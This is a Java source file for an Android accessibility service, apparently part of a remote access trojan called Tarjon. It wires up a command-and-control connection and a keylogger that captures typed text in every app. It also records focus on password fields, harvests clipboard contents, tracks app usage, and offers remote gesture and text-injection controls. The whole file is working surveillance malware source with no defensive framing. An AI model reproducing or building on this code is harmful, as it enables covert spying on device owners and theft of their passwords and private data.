package com.tarjon.admin.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.tarjon.admin.network.C2Connection;
import com.tarjon.admin.utils.AppUsageTracker;
import com.tarjon.admin.utils.KeyloggerManager;
import com.tarjon.admin.utils.NotificationListener;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Accessibility service for monitoring user interactions and automating UI actions
 */
public class TarjonAccessibilityService extends AccessibilityService {
    private static final String TAG = "TarjonAccessibility";
    
    private C2Connection c2Connection;
    private KeyloggerManager keyloggerManager;
    private NotificationListener notificationListener;
    private AppUsageTracker appUsageTracker;
    private ClipboardManager clipboardManager;
    private ClipboardManager.OnPrimaryClipChangedListener clipboardListener;
    
    private String currentPackage = "";
    private String currentActivity = "";
    
    // Singleton instance
    private static TarjonAccessibilityService instance;
    
    public static TarjonAccessibilityService getInstance() {
        return instance;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Accessibility service created");
        
        instance = this;
        
        // Initialize C2 connection
        c2Connection = C2Connection.getInstance(this);
        
        // Initialize keylogger manager
        keyloggerManager = new KeyloggerManager(this, c2Connection);
        
        // Initialize notification listener
        notificationListener = new NotificationListener(this, c2Connection);
        
        // Initialize app usage tracker
        appUsageTracker = new AppUsageTracker(this, c2Connection);
        appUsageTracker.startTracking();
        
        // Setup clipboard monitoring
        setupClipboardMonitoring();
        
        // Notify service start
        c2Connection.sendCommandResult("accessibility", "Accessibility service started");
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            // Process notifications
            if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                notificationListener.processNotification(event);
            }
            
            // Process window state changes (for app usage tracking)
            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                String className = event.getClassName() != null ? event.getClassName().toString() : "";
                
                if (!packageName.isEmpty() && !packageName.equals(currentPackage)) {
                    currentPackage = packageName;
                    currentActivity = className;
                    
                    // Track app usage
                    appUsageTracker.trackAppUsage(packageName, className);
                }
            }
            
            // Process text changes (for keylogging)
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                String text = event.getText() != null && !event.getText().isEmpty() ? event.getText().get(0).toString() : "";
                
                if (!text.isEmpty()) {
                    keyloggerManager.logTextChange(packageName, text);
                }
            }
            
            // Process click events
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                processClickEvent(event);
            }
            
            // Process focused events
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
                processFocusEvent(event);
            }
            
            // Process scroll events
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
                processScrollEvent(event);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing accessibility event: " + e.getMessage());
        }
    }
    
    /**
     * Process click events
     */
    private void processClickEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String className = event.getClassName() != null ? event.getClassName().toString() : "";
            
            AccessibilityNodeInfo source = event.getSource();
            String nodeText = "";
            String nodeContentDesc = "";
            String nodeResourceId = "";
            
            if (source != null) {
                nodeText = source.getText() != null ? source.getText().toString() : "";
                nodeContentDesc = source.getContentDescription() != null ? source.getContentDescription().toString() : "";
                nodeResourceId = source.getViewIdResourceName() != null ? source.getViewIdResourceName() : "";
                source.recycle();
            }
            
            // Create event data
            JSONObject clickData = new JSONObject();
            clickData.put("packageName", packageName);
            clickData.put("className", className);
            clickData.put("text", nodeText);
            clickData.put("contentDescription", nodeContentDesc);
            clickData.put("resourceId", nodeResourceId);
            clickData.put("timestamp", System.currentTimeMillis());
            
            // Log the click event
            keyloggerManager.logClickEvent(packageName, clickData.toString());
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing click event: " + e.getMessage());
        }
    }
    
    /**
     * Process focus events
     */
    private void processFocusEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String className = event.getClassName() != null ? event.getClassName().toString() : "";
            
            // Check if this is a password field
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                boolean isPassword = source.isPassword();
                String nodeText = source.getText() != null ? source.getText().toString() : "";
                String nodeContentDesc = source.getContentDescription() != null ? source.getContentDescription().toString() : "";
                String nodeResourceId = source.getViewIdResourceName() != null ? source.getViewIdResourceName() : "";
                
                // Log password field focus
                if (isPassword) {
                    JSONObject focusData = new JSONObject();
                    focusData.put("packageName", packageName);
                    focusData.put("className", className);
                    focusData.put("isPassword", true);
                    focusData.put("contentDescription", nodeContentDesc);
                    focusData.put("resourceId", nodeResourceId);
                    focusData.put("timestamp", System.currentTimeMillis());
                    
                    keyloggerManager.logPasswordFieldFocus(packageName, focusData.toString());
                }
                
                source.recycle();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing focus event: " + e.getMessage());
        }
    }
    
    /**
     * Process scroll events
     */
    private void processScrollEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String className = event.getClassName() != null ? event.getClassName().toString() : "";
            
            // For scroll events, we're mainly interested in tracking user activity
            keyloggerManager.logUserActivity(packageName, "scroll");
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing scroll event: " + e.getMessage());
        }
    }
    
    /**
     * Setup clipboard monitoring
     */
    private void setupClipboardMonitoring() {
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        
        if (clipboardManager != null) {
            clipboardListener = () -> {
                try {
                    ClipData clipData = clipboardManager.getPrimaryClip();
                    if (clipData != null && clipData.getItemCount() > 0) {
                        ClipData.Item item = clipData.getItemAt(0);
                        String text = item.getText() != null ? item.getText().toString() : "";
                        
                        if (!text.isEmpty()) {
                            JSONObject clipboardData = new JSONObject();
                            clipboardData.put("text", text);
                            clipboardData.put("timestamp", System.currentTimeMillis());
                            clipboardData.put("packageName", currentPackage);
                            
                            keyloggerManager.logClipboardChange(currentPackage, clipboardData.toString());
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing clipboard change: " + e.getMessage());
                }
            };
            
            clipboardManager.addPrimaryClipChangedListener(clipboardListener);
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted");
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Accessibility service destroyed");
        
        // Cleanup
        if (clipboardManager != null && clipboardListener != null) {
            clipboardManager.removePrimaryClipChangedListener(clipboardListener);
        }
        
        if (appUsageTracker != null) {
            appUsageTracker.stopTracking();
        }
        
        instance = null;
        
        // Notify service stop
        c2Connection.sendCommandResult("accessibility", "Accessibility service stopped");
        
        super.onDestroy();
    }
    
    /**
     * Perform a click at coordinates
     * @param x X coordinate
     * @param y Y coordinate
     * @return true if click was dispatched successfully
     */
    public boolean performClick(float x, float y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            return false;
        }
        
        Path clickPath = new Path();
        clickPath.moveTo(x, y);
        
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(
                clickPath, 0, 50);
        
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        
        return dispatchGesture(builder.build(), null, null);
    }
    
    /**
     * Perform a long click at coordinates
     * @param x X coordinate
     * @param y Y coordinate
     * @param duration Duration in milliseconds
     * @return true if long click was dispatched successfully
     */
    public boolean performLongClick(float x, float y, long duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            return false;
        }
        
        Path clickPath = new Path();
        clickPath.moveTo(x, y);
        
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(
                clickPath, 0, duration);
        
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        
        return dispatchGesture(builder.build(), null, null);
    }
    
    /**
     * Perform a swipe gesture
     * @param startX Start X coordinate
     * @param startY Start Y coordinate
     * @param endX End X coordinate
     * @param endY End Y coordinate
     * @param duration Duration in milliseconds
     * @return true if swipe was dispatched successfully
     */
    public boolean performSwipe(float startX, float startY, float endX, float endY, long duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            return false;
        }
        
        Path swipePath = new Path();
        swipePath.moveTo(startX, startY);
        swipePath.lineTo(endX, endY);
        
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(
                swipePath, 0, duration);
        
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        
        return dispatchGesture(builder.build(), null, null);
    }
    
    /**
     * Perform global action (back, home, recents, etc.)
     * @param action AccessibilityService.GLOBAL_ACTION_*
     * @return true if action was performed successfully
     */
    public boolean performGlobalAction(int action) {
        return super.performGlobalAction(action);
    }
    
    /**
     * Perform text input in a text field
     * @param nodeInfo AccessibilityNodeInfo representing the text field
     * @param text Text to input
     * @return true if text was input successfully
     */
    public boolean inputText(AccessibilityNodeInfo nodeInfo, String text) {
        if (nodeInfo == null || !nodeInfo.isEditable()) {
            return false;
        }
        
        Bundle arguments = new Bundle();
        arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
        
        return nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
    }
    
    /**
     * Find a view by text
     * @param text Text to find
     * @return AccessibilityNodeInfo for the found node, or null if not found
     */
    public AccessibilityNodeInfo findViewByText(String text) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) {
            return null;
        }
        
        AccessibilityNodeInfo result = findNodeByText(rootNode, text);
        rootNode.recycle();
        
        return result;
    }
    
    /**
     * Find a view by content description
     * @param contentDescription Content description to find
     * @return AccessibilityNodeInfo for the found node, or null if not found
     */
    public AccessibilityNodeInfo findViewByContentDescription(String contentDescription) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) {
            return null;
        }
        
        AccessibilityNodeInfo result = findNodeByContentDescription(rootNode, contentDescription);
        rootNode.recycle();
        
        return result;
    }
    
    /**
     * Find a view by resource ID
     * @param resourceId Resource ID to find
     * @return AccessibilityNodeInfo for the found node, or null if not found
     */
    public AccessibilityNodeInfo findViewByResourceId(String resourceId) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) {
            return null;
        }
        
        AccessibilityNodeInfo result = findNodeByResourceId(rootNode, resourceId);
        rootNode.recycle();
        
        return result;
    }
    
    /**
     * Find a node by text recursively
     */
    private AccessibilityNodeInfo findNodeByText(AccessibilityNodeInfo node, String text) {
        if (node == null) {
            return null;
        }
        
        // Check if this node matches
        if (node.getText() != null && text.equals(node.getText().toString())) {
            return AccessibilityNodeInfo.obtain(node);
        }
        
        // Check child nodes
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findNodeByText(child, text);
                child.recycle();
                
                if (result != null) {
                    return result;
                }
            }
        }
        
        return null;
    }
    
    /**
     * Find a node by content description recursively
     */
    private AccessibilityNodeInfo findNodeByContentDescription(AccessibilityNodeInfo node, String contentDescription) {
        if (node == null) {
            return null;
        }
        
        // Check if this node matches
        if (node.getContentDescription() != null && contentDescription.equals(node.getContentDescription().toString())) {
            return AccessibilityNodeInfo.obtain(node);
        }
        
        // Check child nodes
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findNodeByContentDescription(child, contentDescription);
                child.recycle();
                
                if (result != null) {
                    return result;
                }
            }
        }
        
        return null;
    }
    
    /**
     * Find a node by resource ID recursively
     */
    private AccessibilityNodeInfo findNodeByResourceId(AccessibilityNodeInfo node, String resourceId) {
        if (node == null) {
            return null;
        }
        
        // Check if this node matches
        if (node.getViewIdResourceName() != null && resourceId.equals(node.getViewIdResourceName())) {
            return AccessibilityNodeInfo.obtain(node);
        }
        
        // Check child nodes
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findNodeByResourceId(child, resourceId);
                child.recycle();
                
                if (result != null) {
                    return result;
                }
            }
        }
        
        return null;
    }
    
    /**
     * Click on a node
     * @param nodeInfo Node to click
     * @return true if click was performed successfully
     */
    public boolean clickOnNode(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo == null) {
            return false;
        }
        
        return nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
    }
    
    /**
     * Long click on a node
     * @param nodeInfo Node to long click
     * @return true if long click was performed successfully
     */
    public boolean longClickOnNode(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo == null) {
            return false;
        }
        
        return nodeInfo.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK);
    }
    
    /**
     * Click on a view by text
     * @param text Text to find and click on
     * @return true if view was found and clicked
     */
    public boolean clickOnViewWithText(String text) {
        AccessibilityNodeInfo node = findViewByText(text);
        if (node != null) {
            boolean result = clickOnNode(node);
            node.recycle();
            return result;
        }
        return false;
    }
    
    /**
     * Click on a view by content description
     * @param contentDescription Content description to find and click on
     * @return true if view was found and clicked
     */
    public boolean clickOnViewWithContentDescription(String contentDescription) {
        AccessibilityNodeInfo node = findViewByContentDescription(contentDescription);
        if (node != null) {
            boolean result = clickOnNode(node);
            node.recycle();
            return result;
        }
        return false;
    }
    
    /**
     * Click on a view by resource ID
     * @param resourceId Resource ID to find and click on
     * @return true if view was found and clicked
     */
    public boolean clickOnViewWithResourceId(String resourceId) {
        AccessibilityNodeInfo node = findViewByResourceId(resourceId);
        if (node != null) {
            boolean result = clickOnNode(node);
            node.recycle();
            return result;
        }
        return false;
    }
    
    /**
     * Get the current package name
     */
    public String getCurrentPackage() {
        return currentPackage;
    }
    
    /**
     * Get the current activity name
     */
    public String getCurrentActivity() {
        return currentActivity;
    }
}